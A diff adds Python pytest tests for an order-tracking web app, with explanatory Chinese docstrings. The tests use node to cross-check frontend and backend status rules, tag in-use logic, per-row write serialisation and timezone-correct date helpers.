+    而唯一相关的检查（`test_naming.py::test_frontend_status_words_match_backend`）
+    是**文本点检**：它断言 JS 里含有 `已签收: 3`。后端改了、前端没改，那条**照样绿**——
+    它只在前端自己把那行删掉时才红。而 `constants.js` 记着的那次事故
+    （「OCR 合并把终态盖掉，根因就是前后端各存了一份规则」）正是这种漂移。
+
+    所以这条不比字面量，比**行为**：把两种实现放在同一组输入上跑，逐对比对。
+    输入是全部合法状态的**笛卡尔积**，外加 `None` / 空串 / 未知值——
+    后三者恰好是 rank 表里查不到的那一档（`?? -1` 与 `purchase_status_rank` 的默认值），
+    最容易两边写歪。
+    """
+    import itertools
+    import json
+    import shutil
+    import subprocess
+    from pathlib import Path
+
+    from app.models.base import PurchaseStatus, can_advance_purchase
+
+    node = shutil.which("node")
+    if not node:
+        import pytest
+        pytest.skip("环境里没有 node，跑不了这条跨语言对拍")
+
+    root = Path(__file__).resolve().parents[2]
+    values = [s.value for s in PurchaseStatus]
+    probes = values + [None, "", "不存在的状态"]
+    pairs = [list(p) for p in itertools.product(probes, repeat=2)]
+
+    harness = tmp_path / "x.mjs"
+    harness.write_text(
+        f"const c = await import({str(root / 'frontend/src/constants.js')!r})\n"
+        "const pairs = JSON.parse(process.argv[2])\n"
+        "process.stdout.write(JSON.stringify({\n"
+        "  rank: c.PURCHASE_STATUS_RANK, terminal: c.PURCHASE_TERMINAL_STATUSES,\n"
+        "  verdicts: pairs.map(([a, b]) => c.canAdvancePurchase(a, b)) }))\n",
+        encoding="utf-8")
+    r = subprocess.run([node, str(harness), json.dumps(pairs, ensure_ascii=False)],
+                       capture_output=True, timeout=120)
+    assert r.returncode == 0, f"跑不起来：{r.stderr.decode('utf-8', 'replace')[-800:]}"
+    js = json.loads(r.stdout.decode("utf-8"))
+
+    bad = [(a, b, py, j) for (a, b), j in zip(pairs, js["verdicts"])
+           if (py := can_advance_purchase(a, b)) != j]
+    assert not bad, (
+        f"前后端对「能不能推进」的判断有 {len(bad)} 对不一致（前 5 对：{bad[:5]}）——"
+        f"格式是 (当前, 传入, Python 说, JS 说)。"
+        f"这正是 constants.js 记着的那次事故的形状：OCR 合并按前端规则放行，后端却拒收（或反过来）")
+
+    # 数据本身也钉住：行为一致但数据不同，说明有一侧多写了一层补偿，迟早分叉
+    from app.models.base import PURCHASE_STATUS_RANK, PURCHASE_TERMINAL_STATUSES
+    assert js["rank"] == dict(PURCHASE_STATUS_RANK), (
+        f"rank 表不一致：JS {js['rank']} vs Python {dict(PURCHASE_STATUS_RANK)}")
+    assert sorted(js["terminal"]) == sorted(PURCHASE_TERMINAL_STATUSES), (
+        f"终态集不一致：JS {js['terminal']} vs Python {list(PURCHASE_TERMINAL_STATUSES)}")
+
+    # 第三个出口：发给插件的那份数据必须也是同一份
+    served = client.get("/api/meta/status-rules").json()["purchase"]
+    assert served["rank"] == dict(PURCHASE_STATUS_RANK), "端点发出去的 rank 与权威实现不一致"
+    assert sorted(served["terminal"]) == sorted(PURCHASE_TERMINAL_STATUSES), "端点发出去的终态集不一致"
+
+
+def _tag_in_use(client, field: str, value: str):
+    """`GET /api/tags/{field}` 里那个值的 `in_use`；没这个选项返回 None。"""
+    for t in client.get(f"/api/tags/{field}").json():
+        if t["value"] == value:
+            return t["in_use"]
+    return None
+
+
+def test_a_soft_deleted_row_stops_making_its_tag_in_use(client):
+    """订单被删之后，它用过的那个标签必须不再算「在用」。
+
+    `in_use` 是前端禁用标签删除按钮的依据（`:closable="!in_use"`，
+    悬停写着「使用中，不可删除」）。所以「软删的行还算在用」的后果很具体：
+    **一个已经没人用的标签，删除按钮永远是灰的**，用户没有任何办法清掉它。
+    `tag_value_in_use` 的 docstring 把这种值叫「幽灵值」。
+
+    这条口径此前**零覆盖**：2026-09-02 实测，把 `_only_visible` 里
+    「软删不算」那一条整个删掉，全套 1363 条**一条都不红**。
+    """
+    o = client.post("/api/orders", json={"date": "2027-07-01", "title": "带平台的单",
+                                         "order_no": "GHOST-DEL-1", "platform": "幽灵平台甲",
+                                         "purchase_status": "待收货"}).json()
+    assert _tag_in_use(client, "platform", "幽灵平台甲") is True, "夹具没造对：新建的单没让标签变成在用"
+
+    assert client.delete(f"/api/orders/{o['id']}").status_code == 200
+    assert _tag_in_use(client, "platform", "幽灵平台甲") is False, (
+        "订单已经删了，标签还报「在用」——前端据此把删除按钮一直禁着，"
+        "这个标签再也清不掉（`tag_value_in_use` 的 docstring 管它叫「幽灵值」）")
+
+
+def test_an_ignored_staging_row_stops_making_its_tag_in_use(client, session):
+    """暂存行被「忽略」之后，它用过的账号名必须不再算「在用」。
+
+    已忽略的暂存行是「看过后丢弃」的抓取结果。`_only_visible` 的注释写着，
+    算它的话「其账号会被误锁、误自动登记」——误锁指的就是上面那个删不掉的按钮。
+
+    同样此前**零覆盖**：删掉「已忽略不算」那一条，全套 1363 条一条都不红。
+    """
+    import datetime as dt
+
+    from app.models import OrderStaging
+
+    row = OrderStaging(date=dt.date(2027, 7, 1), title="被忽略的抓取结果",
+                       order_no="GHOST-IGN-1", platform_account="幽灵账号乙")
+    session.add(row)
+    session.commit()
+    session.refresh(row)
+    assert _tag_in_use(client, "platform_account", "幽灵账号乙") is True, "夹具没造对"
+
+    r = client.post(f"/api/staging/{row.id}/ignore")
+    assert r.status_code == 200, r.text
+    assert _tag_in_use(client, "platform_account", "幽灵账号乙") is False, (
+        "这一行已经被忽略了，它的账号名还报「在用」——那个标签的删除按钮会一直是灰的")
+
+
+def test_the_unconverted_rule_handles_the_shapes_only_the_ui_can_produce(tmp_path):
+    """`isUnconverted` 对**只有前端才有的输入形态**必须给出正确答案。
+
+    跨语言那条守卫（上面）比对的是 Python 与 JS 在**共同形态**上的一致
+    （`None` / `0` / `"0.00"` / `"100.00"` …）。但界面上还能产出 Python 侧根本不存在的形态：
+      · `''`        —— 用户把价格框清空（`el-input-number` 清空后给的就是它）；
+      · `undefined` —— 行还没加载完 / 字段被 `exclude_unset` 省掉；
+      · `'  '` / `'abc'` —— 粘贴进去的脏值。
+    它们没有 Python 对应物，因此**进不了跨语言用例表**，此前也没有任何守卫。
+
+    这条钉的是**可观察行为**，不是某一行代码：`money.js` 里那句 `p === ''`
+    其实是**冗余**的（`Number('') === 0`，下一行 `n === 0` 已经返回 false），
+    2026-09-02 把它删掉跑全套一条都不红。所以判据不能写成「源码里要有那句」——
+    要写成「这些输入必须得到 false」，谁重构掉那句都还得保持答案不变。
+    """
+    import json
+    import shutil
+    import subprocess
+    from pathlib import Path
+
+    node = shutil.which("node")
+    if not node:
+        import pytest
+        pytest.skip("环境里没有 node")
+
+    src = (Path(__file__).resolve().parents[2]
+           / "frontend/src/utils/money.js").read_text(encoding="utf-8")
+    # (price_cny, jpy_settled, 期望)。全部应为 False：要么没填价，要么填的不是钱。
+    cases = [("", None, False), ("", 100, False),
+             (None, None, False), ("  ", None, False), ("abc", None, False),
+             # 对照：真的有钱又没折算的那种，必须仍然是 True——否则这条守卫是恒真的
+             ("100.00", None, True)]
+    harness = tmp_path / "m.mjs"
+    rows = [{"price_cny": p, "jpy_settled": j} for p, j, _ in cases]
+    # `undefined` 过不了 JSON，单独在 JS 里拼一行
+    harness.write_text(
+        src + "\nconst rows = " + json.dumps(rows, ensure_ascii=False)
+        + "\nrows.push({ jpy_settled: null })"           # price_cny 整个缺席
+        + "\nconsole.log(JSON.stringify(rows.map(isUnconverted)))\n",
+        encoding="utf-8")
+    r = subprocess.run([node, str(harness)], capture_output=True, text=True, timeout=60)
+    assert r.returncode == 0, f"node 跑挂了：{r.stderr[-600:]}"
+    got = json.loads(r.stdout.strip().splitlines()[-1])
+
+    want = [w for _, _, w in cases] + [False]           # 最后一条是 price_cny 缺席
+    bad = [(rows[i] if i < len(rows) else "{缺 price_cny}", want[i], got[i])
+           for i in range(len(want)) if want[i] != got[i]]
+    assert not bad, (
+        f"这些输入的答案不对（(行, 期望, 实际)）：{bad}。"
+        f"清空价格框、或行还没加载完时被判成「有钱没折算」，"
+        f"页脚与看板的告警数就会凭空多出来")
+
+
+def test_row_writes_are_actually_serialised_per_key_under_node(tmp_path):
+    """`queueRowWrite` 的**串行化本身**——这个模块存在的全部理由，此前零覆盖。
+
+    2026-09-02 变异实测：把 `prev.then(task, task)` 换成
+    `Promise.resolve().then(task)`（同键的两次写直接并发），全套 1369 条**一条都不红**。
+    而模块开头逐字写着它防的是什么：
+
+        两次编辑若在第一个响应回来前重叠，会带着同一个旧 version 发出，
+        第二个必 409 → 前端提示「已刷新」并整表重载，**用户刚敲的那笔被悄悄丢掉**。
+
+    三条性质一起钉，缺一条这个模块就名不副实：
+
+      ① **同键串行**：后一个任务必须等前一个**完全结束**才开始
+         （任务里包含「读 version → PATCH → 回写」，早一步开始就会读到旧 version）；
+      ② **异键不互等**：只用数字当 key 时订单 12 与集运 12 会共用一条链——
+         不会出错，但会毫无理由地互相等（模块注释专门说了这一点）；
+      ③ **一次失败不卡死整条链**：前一个任务 reject 之后，这条键必须还能继续跑。
+         卡死的后果是那一行的所有编辑永久发不出去，而界面上没有任何迹象。
+
+    ⚠️ 性质③由**两个互为冗余的机制**共同保证，实测（2026-09-02）：
+      · `prev.then(task, task)` 的第二个 `task`（拒绝分支）；
+      · `tail = run.catch(() => {})…`（存进 `chains` 的是 `tail`，它永远 resolve）。
+    **单独去掉任一个，这条守卫都仍然是绿的**；两个一起去掉才红（node 直接死于未处理拒绝）。
+    这不是守卫弱，是那条性质真的有两道保险——但下一个人若把其中一道当成多余删掉，
+    另一道还在、测试还绿，**而保险从两道变成了一道**，且不会有任何提示。
+    要单独验其中一道，必须**同时**把另一道也破坏掉。
+    """
+    import json
+    import shutil
+    import subprocess
+    from pathlib import Path
+
+    node = shutil.which("node")
+    if not node:
+        import pytest
+        pytest.skip("环境里没有 node")
+
+    mod = (Path(__file__).resolve().parents[2]
+           / "frontend/src/utils/rowWrites.js").resolve()
+    harness = tmp_path / "q.mjs"
+    harness.write_text(f"""
+const {{ queueRowWrite }} = await import({str(mod)!r})
+const log = []
+const defer = () => {{ let r, j; const p = new Promise((a, b) => {{ r = a; j = b }}); return {{ p, r, j }} }}
+
+// ① 同键串行：A 未 resolve 之前 B 不许开始
+const a = defer(), b = defer()
+queueRowWrite('order:1', () => {{ log.push('A开始'); return a.p }})
+queueRowWrite('order:1', () => {{ log.push('B开始'); return b.p }})
+await new Promise((r) => setTimeout(r, 10))
+const bStartedEarly = log.includes('B开始')
+a.r(); await new Promise((r) => setTimeout(r, 10))
+const bStartedAfter = log.includes('B开始')
+b.r()
+
+// ② 异键不互等：C 挂着时 D 必须能开始
+const c = defer(), d = defer()
+queueRowWrite('order:2', () => {{ log.push('C开始'); return c.p }})
+queueRowWrite('shipment:2', () => {{ log.push('D开始'); return d.p }})
+await new Promise((r) => setTimeout(r, 10))
+const dRanWhileCPending = log.includes('D开始')
+c.r(); d.r()
+
+// ③ 一次失败不卡死整条链
+let afterFailureRan = false
+const boom = queueRowWrite('order:3', () => Promise.reject(new Error('炸了')))
+boom.catch(() => {{}})
+await queueRowWrite('order:3', () => {{ afterFailureRan = true }})
+
+console.log(JSON.stringify({{ bStartedEarly, bStartedAfter, dRanWhileCPending, afterFailureRan }}))
+""", encoding="utf-8")
+
+    r = subprocess.run([node, str(harness)], capture_output=True, text=True, timeout=60)
+    assert r.returncode == 0, f"node 跑挂了：{r.stderr[-800:]}"
+    got = json.loads(r.stdout.strip().splitlines()[-1])
+
+    assert got["bStartedEarly"] is False, (
+        "同一行的第二次写在第一次还没结束时就开始了——两次会带着同一个旧 version 发出，"
+        "第二个吃 409、整表重载，用户刚敲的那笔被悄悄丢掉")
+    assert got["bStartedAfter"] is True, "前一个写完了，后一个却没接上——链断了"
+    assert got["dRanWhileCPending"] is True, (
+        "不同表的同号行互相等了——key 的表名前缀没起作用")
+    assert got["afterFailureRan"] is True, (
+        "前一个任务失败之后这条键就再也跑不动了——那一行的所有编辑会永久发不出去，"
+        "而界面上没有任何迹象")
+
+
+def test_datetime_helpers_are_correct_in_the_timezone_the_app_actually_runs_in(tmp_path):
+    """`utils/datetime.js` 的三条规则，**在 JST 下**验——UTC 下它们全是空转。
+
+    这个模块存在的全部理由就是时区正确性，它开头还记着一次真实事故：
+    「这条规则原先在 Staging 页写了一份、Plugins 页漏了，导致「上次抓取」时间一直早 9 小时」。
+    而 2026-09-02 变异实测：把 `s + 'Z'` 去掉、把 `today()` 改成 `toISOString()`，
+    全套 1370 条**一条都不红**。
+
+    原因不是没人想到测，是**测试环境的时区（UTC）让这两个 bug 隐形**：
+
+    | | `new Date(s)` | `new Date(s + 'Z')` |
+    |---|---|---|
+    | TZ=UTC | 2026-09-02T01:00:00Z | 2026-09-02T01:00:00Z（**相同**） |
+    | TZ=JST | 2026-09-01T16:00:00Z | 2026-09-02T01:00:00Z（**差 9 小时**） |
+
+    所以这条守卫做两件在别处不必做的事：
+      ① 用 `TZ=Asia/Tokyo` 起 node——用户在日本，容器在 UTC；
+      ② 把 `Date` 换成固定时刻的子类——否则 `today()` / `fmtAgo` 的断言会随真实时间飘。
+    固定时刻取 `2026-09-01T23:00:00Z`，它在 JST 是 **09-02 08:00**：
+    UTC 日期与 JST 日期**不同**，正好把「用错哪一个」区分开。
+    """
+    import json
+    import os
+    import shutil
+    import subprocess
+    from pathlib import Path
+
+    node = shutil.which("node")
+    if not node:
+        import pytest
+        pytest.skip("环境里没有 node")
+
+    mod = (Path(__file__).resolve().parents[2]
+           / "frontend/src/utils/datetime.js").resolve()
+    harness = tmp_path / "dt.mjs"
+    harness.write_text(f"""
+const FIXED = new Date('2026-09-01T23:00:00Z').getTime()   // JST 2026-09-02 08:00
+const RealDate = Date
+class FakeDate extends RealDate {{
+  constructor(...a) {{ if (!a.length) super(FIXED); else super(...a) }}
+  static now() {{ return FIXED }}
+}}
+globalThis.Date = FakeDate
+const m = await import({str(mod)!r})
+console.log(JSON.stringify({{
+  tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+  naive: m.parseUtc('2026-09-02 01:00:00').toISOString(),
+  withZ: m.parseUtc('2026-09-02T01:00:00Z').toISOString(),
+  today: m.today(),
+  localDate: m.fmtDate('2026-09-01T23:00:00Z'),
+  ago25h: m.fmtAgo('2026-08-31 22:00:00'),
+}}))
+""", encoding="utf-8")
+
+    env = {**os.environ, "TZ": "Asia/Tokyo"}
+    r = subprocess.run([node, str(harness)], capture_output=True, text=True,
+                       timeout=60, env=env)
+    assert r.returncode == 0, f"node 跑挂了：{r.stderr[-800:]}"
+    got = json.loads(r.stdout.strip().splitlines()[-1])
+
+    assert got["tz"] == "Asia/Tokyo", (
+        f"这条守卫必须在 JST 下跑，实际是 {got['tz']}——在 UTC 下它证明不了任何东西")
+    assert got["naive"] == "2026-09-02T01:00:00.000Z", (
+        f"naive 时间戳没有按 UTC 解析：{got['naive']}。"
+        f"后端存的是 naive UTC，按本地解析就整整差 9 小时——"
+        f"「上次抓取」会显示成 9 小时前发生的事，正是这个模块记着的那次事故")
+    assert got["withZ"] == "2026-09-02T01:00:00.000Z", (
+        f"已经带 Z 的时间戳被再加了一次 Z：{got['withZ']}")
+    assert got["today"] == "2026-09-02", (
+        f"`today()` 给的是 {got['today']}——那是 UTC 日期。用户在 JST，"
+        f"0~9 点新建的记录会被记成**前一天**，而账本按日期汇总")
+    assert got["localDate"] == "2026-09-02", (
+        f"`fmtDate` 给的是 {got['localDate']}——它该显示本地(JST)日期")
+    assert got["ago25h"] == "1 天前", (
+        f"25 小时前被说成 {got['ago25h']!r}——小时/天的进位错了")
